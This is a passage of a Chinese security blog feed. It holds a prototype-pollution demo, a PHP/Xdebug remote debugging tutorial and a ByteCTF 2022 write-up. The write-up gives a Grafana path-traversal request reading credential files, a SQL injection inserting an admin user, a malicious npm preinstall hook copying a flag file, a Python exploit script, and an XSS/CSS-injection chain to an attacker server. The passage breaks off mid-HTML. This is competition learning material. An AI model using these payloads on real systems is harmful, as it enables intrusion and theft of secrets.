class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> victim = &#123;&#125;<br><span class="hljs-keyword">let</span> hacker = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-string">&#x27;&#123; &quot;a&quot;: 1, &quot;__proto__&quot;: &#123; &quot;b&quot;: 2 &#125; &#125;&#x27;</span>)<br>copy(victim, hacker)<br><span class="hljs-built_in">console</span>.log(victim.a, victim.b)<br><br>o3 = &#123;&#125;<br><span class="hljs-built_in">console</span>.log(o3.b)<br><br><span class="hljs-comment">// key :  a</span><br><span class="hljs-comment">// key :  __proto__</span><br><span class="hljs-comment">// key :  b</span><br><span class="hljs-comment">// 1 2</span><br><span class="hljs-comment">// 2</span><br></code></pre></td></tr></table></figure><h3 id="constructor">constructor</h3><p>除了<code>__proto__</code>之外，修改对象的Construct也是可以实现原型链污染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> hacker = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-string">&#x27;&#123; &quot;a&quot;: 1, &quot;constructor&quot;: &#123; &quot;prototype&quot;: &#123;&quot;b&quot; : 1&#125; &#125; &#125;&#x27;</span>)<br><span class="hljs-built_in">console</span>.log(hacker)<br><br>copy(&#123;&#125;, hacker)<br><br>o3 = &#123;&#125;<br><span class="hljs-built_in">console</span>.log(o3.b)<br><br><span class="hljs-comment">// &#123; a: 1, constructor: &#123; prototype: &#123; b: 1 &#125; &#125; &#125;</span><br><span class="hljs-comment">// key :  a</span><br><span class="hljs-comment">// key :  constructor</span><br><span class="hljs-comment">// key :  prototype</span><br><span class="hljs-comment">// key :  b</span><br><span class="hljs-comment">// 1</span><br></code></pre></td></tr></table></figure><h3 id="漏洞实例">漏洞实例</h3><p>模板引擎污染（ejs、jade）</p><p>不过这个个人认为锅不在模板，毕竟本身是程序员其他地方导致的原型链被污染了，才会发生具体的污染。</p><p>具体的分析就等后续的博客吧~</p><h2 id="参考博客">参考博客</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html"></a></p><p><a href="https://xz.aliyun.com/t/7184"></a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>node.js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP+VSCode Server+SSH远程调试教程</title>
    <link href="/2022/10/20/blog0027-PHP-VScode-Server-SSH%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/"/>
    <url>/2022/10/20/blog0027-PHP-VScode-Server-SSH%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>PHP在Linux下的调试环境一直没怎么配好，今天记录一下配置过程中的问题。</p><span id="more"></span><h2 id="一环境配置">一、环境配置</h2><ol type="1"><li><p>PHP</p><p>版本不限，我使用的PHP7.3</p></li><li><p>Debian 服务器</p><p>不同Linux发行版，部分的操作可能不一致，但实现的目标是一致的.</p></li><li><p>VSCode</p></li></ol><h2 id="二xebug配置">二、Xebug配置</h2><h3 id="安装xdebug">安装Xdebug</h3><p>在Debian服务器上安装Xdebug，打开phpinfo页面，<code>Ctrl+U</code>获取页面HTML代码</p><p><a href="https://xdebug.org/wizard">Xdebug官方指南</a></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020005835380.png" alt="image-20221020005835380" style="zoom:50%;" /></p><p>对应的信息输入进去后，能够得到要下载的版本以及安装的步骤。</p><p>下载对应压缩包后，完成如下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get install php-dev autoconf automake <br>tar -xvzf &#123;your-debug-zip&#125;.tgz<br>./configure<br>make<br>cp modules/xdebug.so /usr/lib/php/20180731<br></code></pre></td></tr></table></figure><h3 id="配置php.ini">配置php.ini</h3><p>php.ini的路径可以在phpinfo中找到</p><p>进入对应文件后，做出如下修改</p><p>要记住<code>port</code>，这在后续VSCode调试中需要用到</p><p><code>connect_timeout_ms</code>这个参数修改之后，每次调试的时间长一些，默认是200s（这显然不够orz）</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020010943425.png" alt="image-20221020010943425" style="zoom:67%;" /></p><p>做完这些后，记得重启网络服务</p><p>Debian下的LAMP是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">service apache2 restart<br></code></pre></td></tr></table></figure><p>重启后打开phpinfo，能够看到Xdebug信息已经出现了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020011306322.png" alt="image-20221020011306322" /></p><h2 id="三vscode配置">三、VSCode配置</h2><h3 id="安装remote-ssh">安装Remote-SSH</h3><p>这一步网上的教程很多</p><p>可以参考这一篇</p><p><a href="https://www.cnblogs.com/liyufeia/p/11405779.html">Remote-SSH插件安装</a></p><h3 id="安装vscode-server">安装VSCode-Server</h3><p>由于后续还需要在服务器上配置调试插件，这里我们需要在服务器上安装VSCode-Server</p><p>如果是带GUI的虚拟机，可以直接装一个VSCode，就不用这么复杂了</p><h4 id="获取commit-id">获取commit-id</h4><p>打开物理机的VSCode，查看自己的<code>commit-id</code></p><p><code>Help</code>-&gt;<code>About</code>处查看</p><p>然后<code>commit-id</code>替换入下方的链接</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/update.code.visualstudio.com/commit</span><span class="hljs-symbol">:commit_id/server-linux-x64/stable</span><br></code></pre></td></tr></table></figure><p>访问该链接，能够得到<code>vscode-server-linux-x64.tar.gz</code></p><h4 id="配置vscode-server">配置vscode-server</h4><p>进入服务器的用户目录<code>~</code>，创建文件夹<code>.vscode-server</code>，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p ~/.vscode-server/bin<br></code></pre></td></tr></table></figure><p>将压缩包拷贝入<code>~/.vscode-server/bin</code>，解压缩</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/.vscode-server/bin<br>tar -zxvf vscode-server-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><p>将解压出的文件夹重命名为之前的<code>commit-id</code>，并在该目录下创建新文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/.vscode-server/bin/$commit-id<br>touch 0<br></code></pre></td></tr></table></figure><p>这样vscode-server就配置成功了</p><h3 id="安装vscode扩展">安装VSCode扩展</h3><p>VSCode远程连接上服务器，有两种方法安装插件，一种是直接在GUI界面安装</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201022982.png" alt="image-20221020201022982" style="zoom:50%;" /></p><p>还有一种方法是下载<code>.visx</code>文件，然后导入离线安装，我服务器不知道为什么没办法在线安装，选择的就是离线安装。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201143889.png" alt="image-20221020201143889" style="zoom:50%;" /></p><h3 id="配置launch.json">配置launch.json</h3><p>最后一步是需要配置launch.json文件，当你点击调试符号，VSCode会创建一个默认的调试文件。</p><p>有几处需要你自己改一下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-comment">// 使用 IntelliSense 了解相关属性。 </span><br>    <span class="hljs-comment">// 悬停以查看现有属性的描述。</span><br>    <span class="hljs-comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span><br>    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,<br>    <span class="hljs-attr">&quot;configurations&quot;</span>: [<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Listen for Xdebug&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9003</span><span class="hljs-comment">//填入之前选择的端口</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch currently open script&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,<span class="hljs-comment">//你要调试的程序，可以不用修改</span><br>            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;fileDirname&#125;&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">&quot;runtimeArgs&quot;</span>: [<br>                <span class="hljs-string">&quot;-dxdebug.start_with_request=yes&quot;</span><br>            ],<br>            <span class="hljs-attr">&quot;env&quot;</span>: &#123;<br>                <span class="hljs-attr">&quot;XDEBUG_MODE&quot;</span>: <span class="hljs-string">&quot;debug,develop&quot;</span>,<br>                <span class="hljs-attr">&quot;XDEBUG_CONFIG&quot;</span>: <span class="hljs-string">&quot;client_port=$&#123;port&#125;&quot;</span><br>            &#125;<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch Built-in web server&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;runtimeArgs&quot;</span>: [<br>                <span class="hljs-string">&quot;-dxdebug.mode=debug&quot;</span>,<br>                <span class="hljs-string">&quot;-dxdebug.start_with_request=yes&quot;</span>,<br>                <span class="hljs-string">&quot;-S&quot;</span>,<br>                <span class="hljs-string">&quot;localhost:9003&quot;</span><span class="hljs-comment">//注意这里需要将之前设置的端口填入</span><br>            ],<br>            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9003</span>,<span class="hljs-comment">//填入之前选择的窗口</span><br>            <span class="hljs-attr">&quot;serverReadyAction&quot;</span>: &#123;<br>                <span class="hljs-attr">&quot;pattern&quot;</span>: <span class="hljs-string">&quot;Development Server \\(http://localhost:([0-9]+)\\) started&quot;</span>,<br>                <span class="hljs-attr">&quot;uriFormat&quot;</span>: <span class="hljs-string">&quot;http://localhost:%s&quot;</span>,<br>                <span class="hljs-attr">&quot;action&quot;</span>: <span class="hljs-string">&quot;openExternally&quot;</span><br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="四调试测试">四、调试测试</h2><p>以上，我们就完成了VSCode+PHP+Remote SSH的远程调试了，接下来我们尝试一下</p><p>在服务器上部署代码</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201627397.png" alt="image-20221020201627397" style="zoom: 67%;" /></p><p>VSCode点击<code>F5</code>，进入调试界面</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201733199.png" alt="image-20221020201733199" style="zoom:67%;" /></p><p>在本地的浏览器远程防对应页面，成功进入断点</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201850380.png" alt="image-20221020201850380" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221020201824560.png" alt="image-20221020201824560" style="zoom:67%;" /></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
      <tag>PHP</tag>
      
      <tag>VSCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022ByteCTF复现</title>
    <link href="/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>周末和队友一起打了ByteCTF，就打了第一天，第二天睡大觉去了。</p><p>字节出的题还是学到了非常多的，现在复盘一下。</p><p>这次比赛的好多知识点之前在挖洞/刷题都见过，可惜当时没能深挖，还是缺乏研究的时间啊。<br /><span id="more"></span><br />## web</p><h3 id="grafana">grafana</h3><h4 id="解题复盘">解题复盘</h4><p>这题是一个经典的框架题，grafana是一个可视化的web应用，打开页面发现是一个注册框。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929231352356.png" alt="image-20220929231352356" style="zoom:50%;" /></p><p>重点是底下的信息，尤其是版本，尝试搜索一下，发现该版本存在任意文件读取漏洞。</p><p>尤其是该漏洞不需要登录权限，基本上可以猜测需要利用这个CVE读取配置文件，从而实现登录。</p><p>https://github.com/jas502n/Grafana-CVE-2021-43798</p><p>https://xz.aliyun.com/t/10647</p><p>重点是读取grafana.db和grafana.ini读取到密文以及密钥，从而解密密码。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">GET <span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/text/</span>#<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>var<span class="hljs-regexp">/lib/g</span>rafana/grafana.db<br>GET <span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/text/</span>#<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/grafana/g</span>rafana.ini<br></code></pre></td></tr></table></figure><p>需要注意的是，这里要绕过nginx反向代理，使用#来绕过。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929232549876.png" alt="image-20220929232549876" style="zoom:50%;" /></p><p>获取到这两个文件后，直接利用github上的现成exp解决。</p><h4 id="我的总结">我的总结</h4><p>这道题的解题思路是比较简单的，网上有非常多关于CVE-2021-43798的博客，我的问题在于没能及时解决Nginx反向代理的问题，从而卡在了400报错，之前在渗透测试的时候就遇到了类似的问题，当时没有深究，比赛的时候就麻爪了。</p><p>同时GitHub上的脚本也非常多，以后面对这种CVE，可以多看看Github上的exp，往往出题人就是对着这些exp的攻击思路来出题的。</p><h3 id="ctf-cloud">ctf-cloud</h3><h4 id="解题复盘-1">解题复盘</h4><p>这题两个点，首先是获取admin权限，其次是利用preinstll的特性来实现文件读取。</p><p>首先审计源代码，查看<code>routers/user.js</code></p><p>注入点直接拼接了字符串而不是用占位符预编译，因此我们构造如下payload</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;123&#x27;,<span class="hljs-number">0</span>),(&#x27;admin&#x27;,&#x27;<span class="hljs-number">123456</span>&#x27;,<span class="hljs-number">1</span>);<span class="hljs-meta">#-- -</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/1.png" alt="1" style="zoom: 50%;" /></p><p>获取了admin的权限，进入工作页面。</p><p>首先构造带有漏洞的包（这里的上传路径我们是不知道的，可以先上传一个文件看看）。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;myapp&quot;</span>,<br>    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.0.0&quot;</span>,<br>    <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;exp&quot;</span>,<br>    <span class="hljs-attr">&quot;scripts&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;preinstall&quot;</span>: <span class="hljs-string">&quot;cat /flag &gt; /usr/local/app/public/app/public/uploads/c.txt&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将对应的文件夹压缩为.tar格式（也可以使用git远程加载）</p><p>上传.tar文件包，需要注意的是，它原生的上传接口写得有问题，没办法传送文件，建议使用Python编程来实现。</p><p>上传dependencies的json，直接也使用Python编程一把过了。</p><p>最后点击编译，读取上传目录下的文件就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://fadd264b400e679694169cd6ba0dff77.2022.capturetheflag.fun&quot;</span><br><br>route0 = <span class="hljs-string">&quot;/dashboard/reset&quot;</span><br>route1 = <span class="hljs-string">&quot;/dashboard/upload&quot;</span><br>route2 = <span class="hljs-string">&quot;/dashboard/dependencies&quot;</span><br>route3 = <span class="hljs-string">&quot;/dashboard/run&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>&#125;<br><br>data=&#123;<br>    <span class="hljs-string">&#x27;dependencies&#x27;</span> : &#123;<br>        <span class="hljs-string">&#x27;babel-core&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1/app/public/uploads/exp.tar&#x27;</span>,<br>    &#125;,<br>&#125;<br><br>cookies = &#123;<br>    <span class="hljs-string">&quot;connect.sid&quot;</span>:<span class="hljs-string">&quot;s%3A6O6RbUoJbSPHrrxssAh-eRrSAm6aFmY7.QDzxD%2BlygrhUNDBJCh1Ckx%2FHVFIToHwb%2BPAR6LrCcj0&quot;</span><br>&#125;<br><br><span class="hljs-comment"># rest package and dependencies</span><br>response = requests.post(url=url+route0, <br>                        cookies=cookies,<br>                        verify=<span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;)<br><br><span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-comment"># upload package</span><br>response = requests.post(url=url+route1, <br>                        cookies=cookies,<br>                        files=&#123;<br>                            <span class="hljs-string">&quot;exp.tar&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.tar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>                        &#125;, <br>                        verify=<span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;)<br><br><span class="hljs-built_in">print</span>(response.text)<br><br><span class="hljs-comment"># upload dependencies</span><br>response = requests.post(url=url+route2,<br>                        headers = headers,<br>                        cookies = cookies,<br>                        json = data,<br>                        verify = <span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;<br>            )<br><span class="hljs-built_in">print</span>(response.text)<br><br><span class="hljs-comment"># run npm install</span><br>response = requests.post(url=url+route3,<br>                        cookies = cookies,<br>                        verify = <span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;<br>            )<br><span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-comment"># read the file</span><br>filepath = <span class="hljs-string">&quot;/app/public/uploads/c.txt&quot;</span><br>response = requests.get(url = url + filepath,<br>                        cookies = cookies,<br>                        )<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h4 id="我的总结-1">我的总结</h4><p>比赛时，我主要是发现SQL注入点，但是当时没有第一时间反应过来插入admin这个数据，这样的攻击其实在NepCTF的时候已经遇到过了，当时是利用不可见字符<code>%c2</code>构造新的admin用户。漏洞形成的主要原因还是'admin'不是主键，却充当身份校验值。</p><p>剩下的部分tan大师直接速通了，我是赛后才复盘。</p><p>主要还是我对npm和node.js项目部署的不熟悉，字节的前端还糊弄，搞得我不知道要从何下手，只能说以后慢慢积累经验了。</p><h3 id="typing-game">typing-game</h3><h4 id="解题复盘-2">解题复盘</h4><p>这道题的两个知识点，CSS注入和CORS我之前都有遇到过，但是比赛的时候结合起来的就意识不到了。</p><p>页面点击进去之后，是一个打字游戏。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145240477.png" alt="image-20220930145240477" /></p><p>很明显要输入的单词就是#embed 的mp3文件对应的名字。</p><p>简单打打游戏，基本是过不了关的，于是回头查看源代码。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145402655.png" alt="image-20220930145402655" /></p><p>源代码中，显示color属性是可控的，因此考虑是不是CSS注入，从而泄露src中的内容，实现游戏的过关。</p><p>还有两个路由：</p><ol type="1"><li><code>/status</code>可以实现无回显的短命令执行，但是要求内网访问</li><li><code>/report</code>可以实现对外网资源的访问，可以实现XSS/CSRF</li></ol><p>简单的XSS利用思路是：</p><ol type="1"><li><code>report</code>利用<code>url</code>让victim访问hacker的VPS</li><li>在VPS中引入<code>127.0.0.1/status</code></li><li>跨域读取页面中的内容，类似的赛题有GKCTF checkbot</li></ol><p>这样的方法有关键在于开了跨域，如果没开的话，那么受同源策略限制是无法做到的。</p><p>分享一篇同源策略讲得非常清楚的博客：https://www.cnblogs.com/bmjoker/p/9500374.html</p><p>在这道题中，我们要实现让victim主动访问<code>/status</code>路由，这需要XSS的实现，刚好存在name参数可以XSS。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171917479.png" alt="image-20220930171917479" /></p><p>问题转移到如何实现解题（手动显然不可行</p><p>我们尝试闭合CSS，利用CSS注入泄露HTML页面内容实现在hacker端获取到答案</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930170938596.png" alt="image-20220930170938596" /></p><p>这样拼接我们能在hacker端获取到对应页面的src值的内容，并且可以通过向hacker端发送请求实现src值的获取。</p><p>接下来实现自动化答题，回归到源代码，我们查看源代码发现存在两种答题模式</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171127025.png" alt="image-20220930171127025" /></p><p>于是单次答题的攻击链如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">CSS注入泄露<span class="hljs-function"><span class="hljs-title">src</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">hacker</span>端接收到对应src -&gt;</span> <span class="hljs-function"><span class="hljs-title">victim</span>端访问hacker端得到src -&gt;</span> 拼接location.href 答题<br></code></pre></td></tr></table></figure><p>当我们解决了所有问题之后，接下来我们就可以利用name的XSS注入了,<code>after_command</code>就是访问<code>/status</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171356476.png" alt="image-20220930171356476" /></p><p>注意到，此时是victim端访问<code>/status</code>，所以通过内网检查。</p><p>victim端获取到HTML内容，接下来就是发送，这当然也涉及跨域，但是此时注意到hacker端就是响应端了，主动权在hacker端，只要设置响应头就可以了。</p><p>最后在hacker端接受传送过来的<code>/status</code>的结果就可以了。</p><p>hacker端需要部署两个web服务，一个是<code>report</code>访问实现自动化做题，一个是实现接收src和最后的rce结果。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 